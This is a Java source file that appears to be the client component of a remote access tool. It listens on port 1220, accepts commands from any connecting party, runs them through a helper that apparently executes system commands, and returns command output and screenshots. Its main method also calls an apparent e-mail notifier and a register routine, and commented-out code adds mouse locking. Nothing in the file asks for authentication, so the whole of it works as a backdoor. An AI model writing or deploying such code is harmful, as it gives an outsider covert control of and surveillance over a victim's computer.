package com.dsc.dci;

import java.awt.AWTException;
import java.awt.Robot;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

import com.dsc.publicmethod.eMail;
import com.dsc.publicmethod.pubFunc;

public class ClientSocket {
	ServerSocket serverSocket;
	Socket socket;
	DataInputStream dis;
	DataOutputStream dos;

	public ClientSocket() {
		try {
			serverSocket = new ServerSocket(1220);
			while (true) {
				try {
					socket = serverSocket.accept();
					dis = new DataInputStream(socket.getInputStream());
					dos = new DataOutputStream(socket.getOutputStream());
				} catch (IOException e) {
					try {
						dis.close();
						dos.close();
					} catch (IOException e1) {
						e1.printStackTrace();
					}
					e.printStackTrace();
				}
//				try {
//					// robot可以执行不少操作，如处理鼠标键盘
//					robot = new Robot();
//				} catch (AWTException e) {
//					e.printStackTrace();
//				}
				doSomething();
			}
		} catch (IOException e1) {
			e1.printStackTrace();
		}

	}
	public void dos(byte[] imageData){
		if (imageData != null) {
			try {
				dos.writeUTF("getPic()");
				dos.writeInt(imageData.length);
				dos.write(imageData);
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
	public void doSomething() {
		while(true){
			
			try {
				String command = dis.readUTF().trim();
				if(command.startsWith("-client exit")){
					
				}else if(command.startsWith("-p")){
					dos(new pubFunc().sendPic());
				}else if(command.startsWith("-r")||command.startsWith("exit")){
				}else{
					dos.writeUTF(new pubFunc().dosExe(command));
				}
//			if (commendString.startsWith("-p")) {// 截图
//				sendPic();
//			} else if (commendString.startsWith("-m")) {// 锁定鼠标
//				try {
//					commendString = commendString.substring(3);
//				} catch (Exception ee) {
//					continue;
//				}
//				mouseLock(commendString);
//			} else if (commendString.startsWith("-flash")) {
//				try {
//					commendString = commendString.substring(7);
//				} catch (Exception e) {
//					commendString = "";
//				}
//				new Flash(commendString);
//			} else {
//				dosExe(commendString);
//			}
			} catch (IOException e) {
				e.printStackTrace();
				break;
			}
		}

	}

	public static void main(String[] agvs) {
		System.out.println(new pubFunc().getJarName(pubFunc.class));
		new eMail();
		new pubFunc().register();
		new ClientSocket();
	}
}
